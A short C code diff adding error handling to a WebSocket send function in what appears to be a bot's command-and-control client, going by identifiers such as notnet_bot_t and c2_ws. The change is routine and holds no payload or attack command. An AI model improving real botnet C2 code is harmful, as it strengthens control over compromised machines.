@@ -692,7 +692,12 @@ int ws_send(notnet_bot_t *bot, const char *data, int len) {
     ws_apply_mask((uint8_t *)masked, send_len, mask);
 
     /* Send header + masked payload */
-    send(bot->c2_ws.sock, header, hdr_len, 0);
+    int hdr_sent = send(bot->c2_ws.sock, header, hdr_len, 0);
+    if (hdr_sent < 0) {
+        log_warn("ws_send: header send failed: %s", strerror(errno));
+        free(masked);
+        return -1;
+    }
     int result = send(bot->c2_ws.sock, masked, send_len, 0);
     free(masked);
     return result;
